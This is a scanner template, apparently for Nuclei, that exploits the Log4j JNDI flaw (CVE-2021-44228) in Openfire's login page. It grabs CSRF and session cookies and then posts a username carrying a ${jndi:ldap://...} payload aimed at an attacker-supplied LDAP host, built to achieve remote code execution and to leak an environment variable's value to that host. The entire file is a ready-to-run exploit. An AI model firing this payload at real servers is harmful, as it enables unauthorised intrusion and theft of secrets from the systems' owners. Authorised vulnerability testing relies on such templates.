id: CVE-2021-44228-openfire-exploit

info:
  name: Openfire Log4j JNDI RCE
  author: nvn1729
  severity: high
  tags: rce,jndi,log4j

requests:
  - raw:
      - |
        GET /login.jsp HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /login.jsp HTTP/1.1
        Host: {{Hostname}}
        Cookie: csrf={{csrf}};JSESSIONID={{sessionid}}
        Content-Type: application/x-www-form-urlencoded

        login=true&&username=${jndi:ldap://{{ldap-ip-port}}/{{base-path}}/{{env-var}}/${{{env-var}}}}&password=abcd&csrf={{csrf}}
    extractors:
      - type: regex
        name: csrf
        part: header
        internal: true
        group: 1
        regex:
          - "Set-Cookie:\\scsrf=(.*);Path"
     
      - type: regex
        name: sessionid
        part: header
        internal: true
        group: 1                                      
        regex:
          - "Set-Cookie:\\sJSESSIONID=(.*);Path"
